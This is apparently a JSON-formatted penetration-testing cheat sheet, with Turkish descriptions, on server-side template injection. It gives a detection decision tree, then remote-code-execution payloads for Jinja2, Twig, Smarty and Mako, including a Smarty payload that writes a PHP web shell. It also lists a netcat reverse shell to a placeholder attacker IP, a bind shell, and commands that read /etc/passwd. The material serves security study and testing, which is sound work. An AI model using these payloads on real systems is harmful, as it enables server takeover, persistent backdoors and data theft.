{
  "ssti_guide": {
    "definition": {
      "name": "Server-Side Template Injection",
      "abbreviation": "SSTI",
      "description": "Sunucu tarafı template motorlarının istismar edilmesinden kaynaklanan güvenlik açığı"
    },
    "methodology": {
      "steps": [
        {
          "order": 1,
          "name": "Tespit",
          "description": "Template motoru kullanan web uygulamasında SSTI zafiyeti araştırması"
        },
        {
          "order": 2,
          "name": "Tanımlama",
          "description": "Kullanılan template motorunun belirlenmesi"
        },
        {
          "order": 3,
          "name": "İstismar",
          "description": "Tespit edilen zafiyetin sömürülmesi"
        }
      ]
    },
    "template_engine_detection": {
      "decision_tree": {
        "initial_payload": "${7*7}",
        "branches": [
          {
            "payload": "${7*7}",
            "responses": [
              {
                "result": "49",
                "next_payload": "a{*comment*}b"
              },
              {
                "result": "${7*7}",
                "next_payload": "{{7*7}}"
              }
            ]
          },
          {
            "payload": "a{*comment*}b",
            "responses": [
              {
                "result": "ab",
                "engines": ["Smarty", "Mako"]
              },
              {
                "result": "a{*comment*}b",
                "status": "Unknown"
              }
            ]
          },
          {
            "payload": "{{7*7}}",
            "responses": [
              {
                "result": "49",
                "next_payload": "{{7*'7'}}"
              },
              {
                "result": "Not vulnerable",
                "status": "Safe"
              }
            ]
          },
          {
            "payload": "{{7*'7'}}",
            "responses": [
              {
                "result": "7777777",
                "engine": "Jinja2"
              },
              {
                "result": "49",
                "engine": "Twig"
              },
              {
                "result": "Not vulnerable",
                "status": "Unknown"
              }
            ]
          }
        ]
      }
    },
    "template_engines": {
      "jinja2": {
        "language": "Python",
        "detection_payload": "{{7*'7'}}",
        "expected_result": "7777777",
        "rce_payloads": [
          "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
          "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"
        ]
      },
      "twig": {
        "language": "PHP",
        "detection_payload": "{{7*'7'}}",
        "expected_result": "49",
        "rce_payloads": [
          "{{['id']|filter('system')}}",
          "{{['<command>']|filter('system')}}"
        ]
      },
      "smarty": {
        "language": "PHP",
        "detection_payload": "a{*comment*}b",
        "expected_result": "ab",
        "rce_payloads": [
          "{php}echo `id`;{/php}",
          "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[cmd]); ?>',true)}"
        ]
      },
      "mako": {
        "language": "Python",
        "detection_payload": "a{*comment*}b",
        "expected_result": "ab",
        "rce_payloads": [
          "<%import os%>${os.system('id')}",
          "${__import__('os').system('ls')}"
        ]
      }
    },
    "exploitation_techniques": {
      "command_execution": {
        "description": "Template motor üzerinden sistem komutları çalıştırma",
        "common_commands": ["id", "whoami", "ls", "cat /etc/passwd"]
      },
      "reverse_shell": {
        "description": "Saldırganın makinesine bağlantı kuran shell",
        "netcat_payload": "nc -e /bin/bash <attacker_ip> <port>"
      },
      "bind_shell": {
        "description": "Hedef makinede port açarak shell erişimi sağlama",
        "netcat_payload": "nc -nvlp <port> -e /bin/bash"
      }
    },
    "common_payloads": {
      "basic_math": [
        "${7*7}",
        "{{7*7}}",
        "#{7*7}",
        "${{7*7}}"
      ],
      "detection_tests": [
        "{{7*'7'}}",
        "a{*comment*}b",
        "${{''.join('ab')}}"
      ]
    },
    "references": {
      "hacktricks": "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection",
      "portswigger": "https://portswigger.net/web-security/server-side-template-injection"
    }
  },
